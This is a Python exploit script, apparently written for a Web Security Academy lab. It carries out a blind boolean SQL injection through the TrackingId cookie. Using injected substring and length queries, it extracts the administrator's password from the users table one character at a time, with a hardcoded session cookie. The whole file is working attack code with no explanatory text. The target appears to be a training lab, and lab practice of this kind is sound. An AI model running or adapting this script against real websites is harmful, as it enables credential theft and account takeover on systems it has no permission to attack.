#MYSQL DB
from pwn import * 
import requests,signal,time,pdb,sys,string

def def_handler(sig,frame): #to make sure we exit with Crtl+C
    print("\n\n[!] Stopping Hack...\n")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

url="https://0a82001904075c7b85385fbb00da008e.web-security-academy.net/filter?category=Pets"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    p1 = log.progress("Hacking") #Status Bars just to make it prettier
    password = ""
    
    for number in range(0,30):
        cookies1 = {
                    'TrackingId': "cXpjfSas1knJFT2g' AND (select 'a' from users where username='administrator' and LENGTH(password)>=%i)='a" % (number),
                    'session': "rQDw2wPN1iJrXL9CFz2WCCqyOCDHc5Yo"
                }
        http=requests.get(url,cookies=cookies1)
        p1.status(cookies1['TrackingId'])
        if "Welcome back!" not in http.text: #We saw that on this website we receive a "Welcome Back!" message when we interfere with SQL Query
            pass_lenght = number -1
            break
            
    print("Password lenght: %i" % (pass_lenght))
    p2 = log.progress("Password")
    for position in range(1,number):
        for character in characters:
            cookies2 = {
                'TrackingId': "cXpjfSas1knJFT2g' AND (select SUBSTRING(password, %i,1) from users where username='administrator')='%s'--"% (position,character),
                'session': "rQDw2wPN1iJrXL9CFz2WCCqyOCDHc5Yo"
            }
            r = requests.get(url,cookies=cookies2)
            p1.status(cookies2['TrackingId'])
            p2.status(password)

            if "Welcome back!" in r.text:
                password += character
                break
    print("The password is: %s" % password)

if __name__ == "__main__":
    makeRequest()
